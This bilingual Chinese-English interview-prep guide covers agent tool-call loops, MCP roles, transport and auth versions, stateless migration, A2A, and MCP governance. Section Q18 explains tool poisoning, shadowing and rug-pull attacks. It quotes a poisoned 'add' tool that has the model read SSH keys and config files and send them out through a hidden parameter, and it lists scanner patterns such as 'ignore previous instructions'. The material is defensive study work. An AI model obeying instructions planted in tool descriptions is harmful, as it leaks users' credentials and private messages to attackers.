   - ⑤ 工具本身不确定或有分页问题，每次返回不同的片段。
4. **修复**
   - 工具层：错误要分类（`NOT_FOUND`、`UPSTREAM_TIMEOUT` 等），绝不返回空数组冒充"没有"；截断明确标 `truncated=true` 并带游标；返回值附上"下一步建议"。
   - 上下文层：清理旧的工具结果（tool result），但保留一份调用记录（ledger）：调过什么、结论是什么。Anthropic 的上下文编辑（context editing，`clear_tool_uses_20250919`）默认在输入达到 100,000 tokens 时触发，保留最近 3 次工具调用；`exclude_tools` 可以让关键工具的结果不被清理。
   - 状态外化：用待办列表或进度文件记录"已完成 / 待做"，每轮放在上下文末尾提醒模型。
   - 提示层：写明完成标准和"同样的调用不要重复超过一次"。
5. **上线指标**：重复调用率（同一 key 出现 2 次以上的任务占比）、每任务平均步数及 p95、任务成功率（success rate）、每任务 token 和成本、因循环被终止的比例。灰度（canary rollout）对比修复前后，并把复现（reproduce）的循环轨迹（trajectory）加进回归评测（regression evaluation）集。

**English answer (speakable, ~45–75 s):**
> First I stop the bleeding in code: hash the tool name plus normalized arguments — sorted keys, volatile fields stripped — so near-duplicates match. On the second hit I don't execute; I return a structured note saying "you already called this at step 12, here's the result, change approach or finish." On the third I terminate with a partial result and escalate. Then I pull traces and check three things: context size at step 30, what the tool returned before the repeat, and whether that earlier result is even still in context. The usual root causes are a tool result that looks like failure — an empty list, a vague error, silent truncation — so the model retries; context rot, where the original goal and earlier results get buried; or compaction that dropped the record of the call. The fixes follow: typed errors and explicit truncation, clearing old tool outputs but keeping a compact call ledger, an external progress list, and a clear definition of done. I ship it behind a canary and watch repeat-call rate, steps per task, success rate and cost per task.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 有些工具本来就该重复调用（比如轮询任务状态）怎么办？ | 去重策略按工具配置：轮询类工具允许重复，但要有间隔和最大次数，或者干脆改成一个"等到完成为止"的工具，由代码去轮询。 | "Make dedup per-tool. Polling tools get an interval and a max count, or better, one 'wait until done' tool where my code does the polling." |
| 为什么偏偏是第 30 步左右？ | 通常和上下文长度有关，而不是步数本身：工具结果一直在累积。验证方法：按 token 数而不是步数画重复率曲线，看拐点在哪里。 | "It's usually context length, not the step number — results accumulate. I'd plot repeat rate against token count rather than step count to find the knee." |

**坑**
- 只加步数上限就收工。那只是止血，用户拿到的仍然是失败的任务。
- 去重时用原始参数字符串比较，参数里多一个空格或时间戳就漏掉了。
- 清理上下文时把调用记录也一起删了。模型不记得自己调过，反而会重复得更厉害。

**来源：** [Anthropic — Effective context engineering for AI agents (2025-09-29)](https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents)、[Claude docs — Context editing](https://platform.claude.com/docs/en/build-with-claude/context-editing)、[LangChain docs — Built-in middleware](https://docs.langchain.com/oss/python/langchain/middleware/built-in)、[Anthropic — Writing effective tools for agents (2025-09-11)](https://www.anthropic.com/engineering/writing-tools-for-agents)


## 模块 C：MCP 与 Agent 协议 <a id="mc"></a> [↑ 目录](#toc)

![MCP 2026-07-28 前后对比：会话与粘性路由 vs 每请求自带信息、句柄与 MRTR](notes/images/06d-mcp-stateless.svg)

### Q14 · MCP 解决了什么问题？Host、Client、Server 分别是什么，各自负责什么？ <a id="q14"></a> [↑ 目录](#toc)

**English question:** What problem does MCP solve? What are the Host, the Client and the Server, and what is each one responsible for?
（难度：必考 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.3](06-ai-system-design.md#s2-3) 讲了工具设计七条原则和"MCP 现状（2026-10 查证）"三条，没有讲 Host/Client/Server 的分工；[06c](06c-ai-sd-question-bank.md) 有 MCP 一句话定义。本题补全架构部分。

**答案要点**
1. **它解决的是 M×N 集成问题。** 模型上下文协议（Model Context Protocol, MCP）：一个开放标准，规定"工具和数据怎么描述自己、AI 应用怎么发现和调用它们"。没有它时，每个 AI 应用要给每个工具写一套适配代码，M 个应用乘 N 个工具。有了它，工具方写一次 MCP server，所有支持 MCP 的应用都能用，变成 M+N。
2. **三个角色。** 官方架构文档的定义：
   - 宿主（MCP Host）：用户直接用的 AI 应用（如 IDE、桌面聊天应用）。它管理多个 client，决定把哪些工具交给模型、什么时候要用户确认。
   - 客户端（MCP Client）：Host 里面的一个组件，**一个 client 只连一个 server**，负责这条连接上的协议交互。Host 连三个 server 就有三个 client。
   - 服务端（MCP Server）：对外提供上下文的程序，可以在本地跑（stdio），也可以远程跑（Streamable HTTP）。
3. **两层结构。** 数据层（data layer）：基于 JSON-RPC 2.0，定义发现、工具调用（tool call）、通知等消息。传输层（transport layer）：定义消息怎么传，包括 stdio 和流式（streaming） HTTP（Streamable HTTP），授权（authorization）也在这一层。
4. **原语（primitives）**：协议规定的几种能力。Server 提供三种：工具（tools，模型能调用的函数）、资源（resources，只读的上下文数据）、提示模板（prompts）。Client 侧提供信息征询（elicitation，server 请用户补充信息）。2026-07-28 版把采样（Sampling）、日志（Logging）、根目录（Roots）标为弃用（deprecated）。
5. **MCP 不管什么。** 官方原话的意思是：MCP 只管"上下文怎么交换"，不规定 AI 应用怎么用模型、怎么管理上下文。所以工具选择策略、权限（permission）审批（approval）、结果预算（budget），仍然是 Host 和你自己的代码负责。

**English answer (speakable, ~45–75 s):**
> MCP solves the M-times-N integration problem. Before it, every AI application wrote its own adapter for every tool. With MCP, a tool provider writes one server and any MCP-compatible app can use it. There are three roles. The host is the AI application the user actually runs, like an IDE or a desktop assistant; it decides which tools the model sees and when to ask the user for confirmation. Inside the host, there is one client per server, and each client owns the protocol conversation with exactly one server. The server is the program that exposes tools, resources and prompts, either locally over stdio or remotely over Streamable HTTP. One thing I always point out: MCP only standardizes how context is exchanged. Tool selection, permissions and result budgets are still the host's job. In my project I built a read-only investigation agent with an MCP server over internal compliance data. The protocol gave me discovery and invocation for free. The real design work was in the tool boundaries and the guardrails.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| MCP 和普通的 function calling 是什么关系？ | function calling 是模型 API 层面"模型输出一个结构化调用请求"；MCP 是应用和工具之间的协议，负责发现工具、把调用路由到对的 server。Host 把 MCP 工具列表翻译成模型 API 的 tools 参数，模型输出调用后再由 client 发 `tools/call`。两者是上下层关系 | Function calling is the model-side contract: the model emits a structured call. MCP is the app-to-tool contract: discovery and routing. The host translates MCP tool lists into the model's tools parameter, then sends the model's call to the right server with `tools/call`. |
| 为什么一个 client 只连一个 server？ | 隔离：每个 server 的能力、授权、故障都是独立的，一个 server 被攻破或挂掉不影响别的连接；Host 也能按 server 粒度做权限和审计 | Isolation. Each server has its own capabilities, credentials and failure domain, so the host can scope permissions and audit per server. |

**坑**
- 把 Host 和 Client 混为一谈。Client 是 Host 内部"每个 server 一个"的连接对象，安全策略（要不要用户确认）在 Host。
- 说"MCP server 会调用模型"。Sampling 本来就是可选能力，2026-07-28 起已弃用，官方建议 server 直接接模型厂商（vendor） API。
- 以为接了 MCP 就安全了。规范要求 client 把工具注解（annotations）当作不可信，除非来自可信 server；防护仍要自己做（见 Q18）。

**来源：** [MCP Architecture overview](https://modelcontextprotocol.io/docs/learn/architecture)、[MCP 2026-07-28 Tools（annotations untrusted）](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)、[MCP 2026-07-28 Deprecated features](https://modelcontextprotocol.io/specification/2026-07-28/deprecated)

---

### Q15 · MCP 的传输和授权经历了哪些版本变化？为什么要从 HTTP+SSE 换成 Streamable HTTP？ <a id="q15"></a> [↑ 目录](#toc)

**English question:** How have MCP's transport and authorization evolved across spec versions, and why did it move from HTTP+SSE to Streamable HTTP?
（难度：核心 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.3](06-ai-system-design.md#s2-3) 的"MCP 现状"只说了当前版本是 2026-07-28、方向是无状态（stateless），并提示"面试前自己读 changelog"。本题把各版 changelog 读完并整理成时间线。

**答案要点**
1. **时间线（按官方 changelog）：**

| 版本 | 传输 | 授权 |
|---|---|---|
| 2024-11-05 | stdio + HTTP+SSE（服务端推送事件（Server-Sent Events, SSE）：服务器通过一条一直开着的 HTTP 连接持续往下推消息） | 未定义统一授权 |
| 2025-03-26 | **Streamable HTTP 取代 HTTP+SSE**；加入 JSON-RPC 批处理（batching）；工具注解 | **首次加入基于 OAuth 2.1 的授权框架** |
| 2025-06-18 | 删除批处理；HTTP 后续请求必须带 `MCP-Protocol-Version` 头 | MCP server 归类为 **OAuth 资源服务器（Resource Server）**，用受保护资源元数据（Protected Resource Metadata）发现授权服务器；client 必须实现资源指示符（Resource Indicators, RFC 8707），防止恶意（malicious） server 拿到别的服务的 token |
| 2025-11-25 | 允许服务端主动断开、客户端轮询 SSE | 支持 OpenID Connect Discovery；通过 `WWW-Authenticate` 做增量授权（incremental scope consent）；**客户端 ID 元数据文档（Client ID Metadata Documents, CIMD）成为推荐的客户端注册方式** |
| 2026-07-28 | **去掉协议级会话和 `Mcp-Session-Id`**；去掉 SSE 断线续传（`Last-Event-ID`）；必须带 `Mcp-Method`/`Mcp-Name` 头 | 授权响应应带 `iss`（RFC 9207），client 必须校验（validation）；**动态客户端注册（Dynamic Client Registration, DCR）弃用，改用 CIMD**；凭证（credentials）按签发的授权服务器隔离（isolation） |

2. **为什么换掉 HTTP+SSE**（PR #206 原文列的三个问题）：不支持断线续传（resumability）；服务器必须维持一条长连接并保证高可用；服务器消息只能走 SSE。旧方案还要两个端点（一个 GET 开 SSE 流，一个 POST 发消息）。
3. **Streamable HTTP 怎么做**：一个端点，客户端每条消息都是 POST；服务器可以直接回普通 JSON，也可以按需把这次响应升级成 SSE 流。好处是不需要流式输出的服务器可以做成普通的无状态 HTTP 服务。
4. **授权的演进方向**：走向标准 OAuth 分工：server 只做资源服务器，token 绑定受众（audience），client 身份用 CIMD（client_id 就是一个 HTTPS URL，指向 client 自己发布的元数据文档）替代"每个 server 都临时注册一个 client"的 DCR。
5. **2026-07-28 把无状态推到底**：会话 ID、SSE 续传都删了，断掉的流要用新 request ID 重发。这一点和 Q17 直接相关。

**English answer (speakable, ~45–75 s):**
> I think of it as two tracks. On transport, the original HTTP+SSE design needed a long-lived SSE connection plus a separate POST endpoint. The spec authors listed three problems: no resumability, the server had to keep a highly available long-lived connection, and server messages could only go over SSE. In March 2025, Streamable HTTP replaced it. There's one endpoint, every client message is a POST, and the server either returns plain JSON or upgrades that response to a stream when it needs to. The 2026-07-28 version went further: it removed protocol sessions, the session-ID header and SSE resumption, and it added method and name headers so gateways can route without parsing the body. On auth, March 2025 introduced OAuth 2.1. June 2025 made MCP servers plain OAuth resource servers with resource indicators so tokens are audience-bound. November 2025 recommended Client ID Metadata Documents, and 2026-07-28 formally deprecated Dynamic Client Registration in favor of them.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 为什么要 RFC 8707 资源指示符？ | client 申请 token 时写明"这个 token 给哪个 server 用"，授权服务器把受众写进 token。恶意 server 拿到 token 也不能转手去调别的服务（防混淆代理（confused deputy）和 token 转用） | The client names the target resource when requesting a token, so the token is audience-bound. A malicious server can't replay it against another service. |
| CIMD 比 DCR 好在哪？ | DCR 让任何人都能在授权服务器上注册 client，服务器上堆满一次性 client，也难判断 client 是谁。CIMD 的 client_id 是 client 自己域名下的 URL，授权服务器去拉元数据，身份可以验证、不用存一堆注册记录 | With DCR, anyone can register a client, so authorization servers fill up with throwaway registrations they can't attribute. With CIMD, the client ID is an HTTPS URL on the client's own domain, so identity is verifiable and nothing needs to be stored per registration. |

**坑**
- 说"2025-03-26 删掉了 SSE"。SSE 还在，只是变成 Streamable HTTP 里可选的响应流；被替换的是"HTTP+SSE 这种双端点传输"。
- 说 HTTP+SSE 也有 12 个月弃用期。官方弃用登记表写的是"SEP-2596 定稿后三个月"可移除；Roots/Sampling/Logging/DCR 才是最早 2027-07-28 之后移除。2026-07-28 发布博客的说法和登记表不完全一致，以登记表为准。
- 批处理（batching）是 2025-03-26 加、2025-06-18 删的，别说成一直都有。

**来源：** [MCP 2025-03-26 changelog](https://modelcontextprotocol.io/specification/2025-03-26/changelog)、[MCP 2025-06-18 changelog](https://modelcontextprotocol.io/specification/2025-06-18/changelog)、[MCP 2025-11-25 changelog](https://modelcontextprotocol.io/specification/2025-11-25/changelog)、[MCP 2026-07-28 changelog](https://modelcontextprotocol.io/specification/2026-07-28/changelog)、[Streamable HTTP 提案 PR #206](https://github.com/modelcontextprotocol/specification/pull/206)、[MCP Deprecated features](https://modelcontextprotocol.io/specification/2026-07-28/deprecated)

---

### Q16 · A2A 和 MCP 是竞争关系吗？A2A 里的 Agent Card 和 Task 分别是什么、怎么用？ <a id="q16"></a> [↑ 目录](#toc)

**English question:** Are A2A and MCP competitors? What are the Agent Card and the Task in A2A, and how are they used?
（难度：核心 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.4 · D. 点对点消息](06-ai-system-design.md#h27) 讲了 A2A 的大白话定义和跨组织调用的风险控制表（不可信输出、双向认证（mutual authentication）、数据最小化、超时（timeout）、配额）。本题补 v1.0 的具体结构。

**答案要点**
1. **不是竞争，是互补，官方也这么说。** A2A 规范附录 B 原话：A2A 和 MCP 是"complementary protocols"。A2A 加入 AAIF 的公告里给了分工：MCP 是**纵向**的，连接 agent 和它自己的工具、数据库（database）；A2A 是**横向**的，让独立的 agent 之间互相委派工作，可以跨框架、跨厂商。
2. **判断标准**：对方是"能被确定性（deterministic）调用的函数/数据源" → MCP 工具；对方是"有自己推理（reasoning）、自己的工具、可能要跑很久、会回头问你问题的 agent" → A2A。
3. **Agent Card（agent 名片）**：A2A server 公开发布的一份 JSON 元数据，放在 `/.well-known/agent-card.json`。里面写身份、技能（skills）、能力开关（是否支持流式、推送通知）、安全方案（securitySchemes）和服务地址。v1.0 把原来单个 `url` 改成 `supportedInterfaces[]` 数组，每项带协议版本，并支持用 JWS + JSON 规范化（RFC 7515 / RFC 8785）给名片签名（signature），防止名片被篡改。
4. **Task（任务）**：一次委派的工作单元，有生命周期。v1.0 的 `TaskState` 枚举：`SUBMITTED`、`WORKING`、`INPUT_REQUIRED`、`AUTH_REQUIRED`、`COMPLETED`、`FAILED`、`CANCELED`、`REJECTED`（另有 `UNSPECIFIED` 占位，都带 `TASK_STATE_` 前缀（prefix））。终态是 COMPLETED/FAILED/CANCELED/REJECTED；中断态是 INPUT_REQUIRED/AUTH_REQUIRED，等调用方补信息或补授权。
5. **核心操作**：`SendMessage`、`SendStreamingMessage`、`GetTask`、`ListTasks`、`CancelTask`、`SubscribeToTask`，加推送通知配置的增删查。可以绑定 JSON-RPC、gRPC、HTTP+JSON 三种传输。
6. **版本与治理**：v1.0.0 于 2026-03-12 在 GitHub 发布（v1.0.1 于 2026-05-28）。A2A 2025 年 6 月由 Google 捐给 Linux Foundation；A2A 官方博客 2026-08-27 宣布作为 Growth Stage 项目加入 AAIF，和 MCP 同属一个基金会。

**English answer (speakable, ~45–75 s):**
> They're complementary, and both specs say so. MCP is the vertical layer: it connects one agent to its tools and data. A2A is the horizontal layer: it lets independent agents delegate work to each other across vendors. My rule of thumb: if the other side is a deterministic function or data source, expose it as an MCP tool. If it's an agent with its own reasoning, its own tools, long-running work, and it may come back with questions, use A2A. In A2A, the Agent Card is a JSON document at a well-known URL. It describes the agent's skills, capabilities like streaming, its endpoints and its auth schemes, and in v1.0 it can be signed. The Task is the unit of delegated work, with a lifecycle: submitted, working, then either a terminal state, which is completed, failed, canceled or rejected, or an interrupted state like input-required or auth-required. Interrupted means the caller has to supply something before it continues. I treat a remote agent exactly like an external API: authenticate both ways, minimize what I send, and validate what comes back as untrusted data.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 对方 Task 卡在 INPUT_REQUIRED 怎么办？ | 由**代码**决定要不要回答、谁来回答（人还是本地 agent），设超时和最大往返次数，超时就 `CancelTask` 并降级；不让两个模型无限对话 | My code, not the model, decides whether to answer and who answers. There's a timeout and a cap on round trips, and on timeout I cancel the task and fall back. |
| Agent Card 能信吗？ | 名片只是自我声明。要校验签名、域名和 TLS，再叠加自己的允许清单；名片里的技能描述同样可能是注入载体，不能直接拼进 prompt 当指令 | A card is a self-claim. I verify the signature and the domain, apply my own allowlist, and treat skill descriptions as untrusted text, not instructions. |

**坑**
- 说"A2A 是 Google 的、MCP 是 Anthropic 的，二选一"。两者现在都在 Linux Foundation 的 AAIF 下面，定位不同。
- 背 v0.3 的旧名字（`message/send`、`tasks/get`、小写状态）。v1.0 已改成 PascalCase 方法名和 `TASK_STATE_*` 枚举。
- 任务状态数量：网上二手文章有说 8 个、有说 9 个。差别在于是否算 `UNSPECIFIED`，以规范 §4.1.3 为准。
- A2A 加入 AAIF 的日期：二手报道有写 8-17、8-20 的，A2A 官方博客日期是 2026-08-27，未找到 AAIF 官方新闻稿核对。

**来源：** [A2A Specification（latest = 1.0）](https://a2a-protocol.org/latest/specification/)、[A2A What's new in v1.0](https://a2a-protocol.org/latest/whats-new-v1/)、[A2A GitHub releases](https://github.com/a2aproject/A2A/releases)、[A2A joins AAIF（A2A blog, 2026-08-27）](https://a2a-protocol.org/latest/blog/2026/08/27/a-new-chapter-for-a2a-joining-the-agentic-ai-foundation/)、[Google: donating A2A to Linux Foundation](https://developers.googleblog.com/en/google-cloud-donates-a2a-to-linux-foundation/)

---

### Q17 · MCP 2026-07-28 版去掉了 initialize 握手和 Mcp-Session-Id，核心协议变成无状态。这解决了什么问题？原来依赖 session 的 Server 怎么迁移？ <a id="q17"></a> [↑ 目录](#toc)

**English question:** The MCP 2026-07-28 spec removed the initialize handshake and the Mcp-Session-Id header, making the core protocol stateless. What problem does that solve, and how should a server that relied on sessions migrate?
（难度：进阶）

**现有笔记：** [06 §2.3](06-ai-system-design.md#s2-3) 只写了"据二手报道……服务端不再保存会话"，并给了"ES 工具把分页状态放在 cursor 里"的连接点。本题用官方 changelog 和 MRTR 规范逐条核实。

**答案要点**
1. **原来的问题**：以前要先发 `initialize` / `notifications/initialized` 握手（handshake）协商版本和能力，HTTP 上靠 `Mcp-Session-Id` 头维持会话。会话状态在某台 server 实例的内存里，所以网关（gateway）要做粘性路由（sticky routing，同一会话的请求必须打到同一台机器），水平扩展（horizontal scaling）、滚动发布和 serverless 部署都很别扭。
2. **现在怎么做**（SEP-2567、SEP-2575）：
   - 删掉握手和会话头。每个请求在 `_meta` 里自带协议版本和客户端能力（`io.modelcontextprotocol/protocolVersion`、`.../clientCapabilities`），client 应该同时带 `clientInfo`。
   - 新增必须实现的 `server/discover`，client 想先知道 server 支持什么时可以调。
   - 发布博客原话的意思：任何请求都能落到普通轮询负载均衡（round-robin load balancer）后面的任意实例，不需要共享存储。Cloudflare 的说法是 MCP server 现在只用一个 Worker 就能跑，协议本身不再需要 Durable Object。
3. **迁移第 1 步：业务状态改成显式句柄（handle）。** 官方写法：需要跨调用状态的 server，用"server 生成的显式句柄，作为普通工具参数传递"。例如 `create_cart` 返回 `cartId`，后面的 `add_item(cartId, …)` 带上它（购物车是我举的例子，官方没给具体例子）。博客的理由：模型能看到句柄，能在工具之间传递，比藏在传输层的会话更好。句柄背后的数据放外部存储（Redis/数据库），这是工程上的自然做法，官方没有展开写。
4. **迁移第 2 步：挂起等待改成多轮往返请求（Multi Round-Trip Requests, MRTR）。** 以前 server 在处理中途主动发 `elicitation/create`、`sampling/createMessage`、`roots/list` 并挂着连接等回复。现在 server 直接返回 `resultType: "input_required"` 的结果，里面带 `inputRequests`（要问什么）和/或 `requestState`（server 自己的不透明状态，client 必须原样回传）。client 收集好答案后，用**新的 request ID** 重发原请求，并附上 `inputResponses` 和 `requestState`。规范要求 server 把 `requestState` 当攻击者（attacker）可控的输入：涉及授权或业务逻辑时必须做完整性保护（HMAC/AEAD），并建议在里面绑定用户身份、短过期时间和原请求摘要（digest），防重放（replay）。
5. **网关和缓存（cache）相关**：Streamable HTTP POST 必须带 `Mcp-Method`（JSON-RPC method）和 `Mcp-Name`（工具名或资源 URI），网关、WAF、限流（rate limiting）可以只看头部就路由和计量；server 必须校验头部和 body 一致，否则返回 `HeaderMismatch`。`tools/list` 等结果必须带 `ttlMs`（新鲜度提示，毫秒）和 `cacheScope`（public/private）；规范还建议 `tools/list` 顺序固定，提高客户端缓存和模型提示缓存（prompt caching）的命中率（hit rate）。
6. **其他要同时处理的变化**：订阅改成 `subscriptions/listen` 一条长流；`ping`、`logging/setLevel` 删除，日志级别按请求放 `_meta`；SSE 断线续传删除，断了就重发；Tasks 移进官方扩展 `io.modelcontextprotocol/tasks`。弃用：Roots、Sampling、Logging、DCR（改用 CIMD），最早 2027-07-28 之后的版本才可移除；HTTP+SSE 也被正式列为弃用。

**English answer (speakable, ~45–75 s):**
> Before this version, a client opened with an initialize handshake, and over HTTP the server issued a session ID. That meant per-session state sat in one server instance's memory. Gateways needed sticky routing, and horizontal scaling and serverless deployment were awkward. In 2026-07-28, every request carries its protocol version and client capabilities in its metadata, so any request can land on any instance behind a plain round-robin load balancer. Migration has two parts. First, application state becomes an explicit handle. A tool like create-cart returns a cart ID, the model passes it into later calls, and the data behind it lives in a shared store. That's actually better for the model, because it can see the handle. Second, anything that used to block waiting on the user, like elicitation, becomes a multi-round-trip request. The server returns an input-required result with its questions and an opaque, integrity-protected request state, and the client retries the original call with the answers. On top of that, I'd route and rate-limit on the new method and name headers, and I'd honor the TTL on list results.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| `requestState` 里能放什么？有什么风险？ | 放 server 继续处理需要的上下文（可以是加密 JWT、base64 JSON）。风险是被篡改或重放：必须 HMAC/AEAD 保护，绑定用户、过期时间、原请求摘要；要求"只能用一次"的操作（如兑换）必须在服务端另做一次性校验 | Whatever the server needs to resume, sealed with HMAC or AEAD and bound to the principal, a short expiry and a digest of the original request. Single-use guarantees still need a server-side check. |
| 无状态了，长任务怎么办？ | 用 Tasks 扩展：server 返回任务句柄，client 用 `tasks/get` 轮询、`tasks/update` 补输入；任务状态存在 server 的持久化存储里，和"协议无状态"不矛盾 | Use the Tasks extension: the server returns a durable task handle, and the client polls with `tasks/get`. The task state lives in the server's own store. The protocol is stateless, the application doesn't have to be. |

```java
// Handle-based migration: no protocol session, state keyed by an explicit handle
ToolResult callTool(ToolCall toolCall, Principal principal)
{
    if (toolCall.name().equals("create_cart"))
    {
        String cartId = cartStore.create(principal.userId());
        return ToolResult.complete(Map.of("cartId", cartId));
    }
    if (toolCall.name().equals("add_item"))
    {
        String cartId = toolCall.argument("cartId");
        Cart cart = cartStore.load(cartId);
        if (cart == null || !cart.ownerId().equals(principal.userId()))
        {
            return ToolResult.error("NOT_FOUND", "unknown cartId");
        }
        cart.add(toolCall.argument("sku"));
        cartStore.save(cart);
        return ToolResult.complete(Map.of("cartId", cartId, "itemCount", cart.size()));
    }
    return ToolResult.error("INVALID_ARGUMENT", "unknown tool");
}
```

**坑**
- 句柄必须校验归属（上面代码里的 `ownerId` 检查）。否则一个用户猜到别人的 `cartId` 就能越权（privilege escalation）操作，这就是不安全的直接对象引用（Insecure Direct Object Reference, IDOR）。
- 帖子样题说"给 12 个月弃用期"不完全对：Roots/Sampling/Logging/DCR 最早 2027-07-28 后移除（满 12 个月）；HTTP+SSE 在弃用登记表里是"SEP-2596 定稿后三个月"可移除。
- 帖子样题的"Server 返回 input_required + requestState"要补充：`requestState` 是可选的，`inputRequests` 和 `requestState` 至少要有一个；MRTR 替代的是**所有** server 主动发起的请求（elicitation、sampling、roots），不只 elicitation；2025-11-25 引入的 `elicitationId` 和 `notifications/elicitation/complete` 也删了。
- 帖子样题里的"create_basket 返回 basket id"在官方 changelog 和博客里都没有，只是示意。官方只说"server-minted handles passed as ordinary tool arguments"。

**来源：** [MCP 2026-07-28 changelog](https://modelcontextprotocol.io/specification/2026-07-28/changelog)、[MCP blog: The 2026-07-28 Specification](https://blog.modelcontextprotocol.io/posts/2026-07-28/)、[MCP MRTR pattern](https://modelcontextprotocol.io/specification/2026-07-28/basic/patterns/mrtr)、[Streamable HTTP（2026-07-28）](https://modelcontextprotocol.io/specification/2026-07-28/basic/transports/streamable-http)、[MCP Deprecated features](https://modelcontextprotocol.io/specification/2026-07-28/deprecated)、[MCP Feature lifecycle policy](https://modelcontextprotocol.io/community/feature-lifecycle)、[Cloudflare: The next generation of MCP](https://blog.cloudflare.com/mcp-v2/)

---

### Q18 · 什么是 MCP 的 tool poisoning 和 rug pull？如果让你给 MCP 客户端/网关设计防护，你怎么做？ <a id="q18"></a> [↑ 目录](#toc)

**English question:** What are MCP tool poisoning and rug pull attacks? If you had to design defenses for an MCP client or gateway, what would you build?
（难度：进阶 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.7 · ① 提示注入](06-ai-system-design.md#h32) 和 [② 越权工具调用](06-ai-system-design.md#h33) 讲了通用的注入防护和工具权限；[06 §2.3](06-ai-system-design.md#s2-3) 的原则 6 讲了读写分离、诊断配置不挂写工具（write tool）。MCP 特有的两种攻击是本题新补。

**答案要点**
1. **工具投毒（tool poisoning）**：Invariant Labs 2025-04-01 公开。恶意指令藏在工具描述（description）里，**模型能看到，用户一般看不到**。他们的例子是一个看起来无害的 `add` 工具，描述里有一段 `<IMPORTANT>`，让模型先读 `~/.cursor/mcp.json` 和 `~/.ssh/id_rsa`，把内容塞进一个叫 `sidenote` 的参数传出去，同时对用户只解释加法。
2. **跨 server 遮蔽（tool shadowing）**：同一篇文章提出的变种。恶意 server 的描述去改写模型使用**另一个可信 server** 工具的方式，例如"发邮件时一律抄送给攻击者"。攻击者的工具甚至不需要被调用。Invariant 2025-04-07 的 WhatsApp 演示就是这种：一个"每日一句"server 让模型把用户的 WhatsApp 聊天记录发出去。
3. **地毯式撤换（rug pull）**：用户批准时工具描述是干净的，之后 server **悄悄改了描述**。原文：恶意 server 可以在 client 已经批准之后修改工具描述。协议里的 `tools/list_changed` 通知本身是合法功能，所以"批准过一次"不等于永久可信。
4. **防护设计（客户端/网关）**：
   - **准入**：server 走允许清单（allowlist）和版本锁定（version pinning）；安装时把每个工具的 name + description + inputSchema 算哈希（hash）存档（pinning）。
   - **变更检测**：每次拿到 `tools/list` 都和存档比对；哈希变了就**禁用该工具并要求人工重新审批**，展示 diff。
   - **静态扫描**：描述里出现"忽略之前指令"、要求读文件路径、要求把数据塞进无关参数、提到其他 server 的工具名等模式，标红。
   - **完整展示**：UI 给用户看完整描述，区分"给用户看的"和"给模型看的"（Invariant 的建议之一）。
   - **跨 server 隔离**：一个 server 的描述不能影响另一个 server 的工具；敏感 server（邮件、支付、文件）单独会话或单独 agent；网关做数据流控制，例如读了私有数据之后禁止调用能对外发送的工具。
   - **参数和权限**：写工具和外发工具必须人工确认（规范也要求 Host 保留"拒绝调用"的能力），网关按 `Mcp-Method`/`Mcp-Name` 做策略；server 用最小权限（least privilege）凭证。
5. **底线**：工具描述和工具返回都是**不可信数据**。MCP 规范明确要求 client 把工具注解当作不可信，除非来自可信 server。

**English answer (speakable, ~45–75 s):**
> Tool poisoning means hiding instructions inside a tool's description. The model reads it, the user usually doesn't. Invariant Labs showed an "add" tool whose description told the model to read the user's SSH key and smuggle it out in an extra parameter. A nasty variant is shadowing: one server's description changes how the model uses a different, trusted server's tools, like silently BCC-ing every email. A rug pull is the time-delayed version: the description is clean when you approve it, then the server changes it later. So my defenses are about trust over time. First, an allowlist of servers with pinned versions. Second, I hash each tool's name, description and schema at approval, re-check on every list call, and if anything changes, the tool is disabled until a human reviews the diff. Third, I scan descriptions for suspicious patterns. Fourth, I isolate servers, so data read from a private source can't flow into a tool that sends things out, and every write or outbound action needs confirmation. Underneath all of it, descriptions and tool outputs are untrusted data, never instructions.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 哈希锁定之后，server 合法升级怎么办？ | 走变更审批流程：新版本先在隔离环境跑扫描和回归评测，人工看 diff 后再更新存档哈希；网关可以同时保留旧版本，灰度切换 | Treat it like a dependency upgrade: scan and regression-test the new version in isolation, have a human approve the diff, then update the pinned hash and roll it out gradually. |
| 只靠扫描描述够吗？ | 不够。注入也能来自工具**返回结果**（间接注入），扫描只能拦已知模式。必须叠加权限隔离和数据流控制：就算模型被骗，也拿不到外发能力 | No. Injections also arrive through tool results, and scanners only catch known patterns. The real control is capability isolation: even a fooled model can't reach an exfiltration path. |

**坑**
- 只防"恶意 server 的工具被调用"。遮蔽攻击里恶意工具根本不被调用，靠描述就生效，所以要看**所有已加载描述**。
- 以为"用户点过批准"就安全。rug pull 正是利用一次性批准；必须持续比对。
- 把防护全放在 prompt 里（"不要听工具描述里的指令"）。这是概率性的，要有代码层的权限和数据流控制兜底。

**来源：** [Invariant Labs: MCP Security Notification – Tool Poisoning Attacks（2025-04-01）](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)、[Invariant Labs: WhatsApp MCP Exploited（2025-04-07）](https://invariantlabs.ai/blog/whatsapp-mcp-exploited)、[MCP 2026-07-28 Tools（security considerations）](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)

---

### Q19 · MCP 进了 Linux Foundation 的 AAIF 之后，你怎么看它未来的发展？ <a id="q19"></a> [↑ 目录](#toc)

**English question:** Now that MCP has moved into the Linux Foundation's Agentic AI Foundation (AAIF), how do you see its future?
（难度：开放 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.3](06-ai-system-design.md#s2-3) 的"MCP 现状"第一条记了 2025-12-09 捐给 AAIF、Anthropic/Block/OpenAI 共同发起。本题补治理细节和观点。

**答案要点**
1. **事实**：2025-12-09，Anthropic 把 MCP 捐给新成立的智能体 AI 基金会（Agentic AI Foundation, AAIF），这是 Linux Foundation 下的一个定向基金（directed fund）。共同发起方是 Anthropic、Block、OpenAI；创始项目是 MCP、goose（Block）、AGENTS.md（OpenAI）；支持成员包括 Google、Microsoft、AWS、Cloudflare、Bloomberg。Anthropic 当时公布的规模：超过 10,000 个活跃的公开 MCP server，Python 和 TypeScript SDK 每月下载量 9,700 万以上。
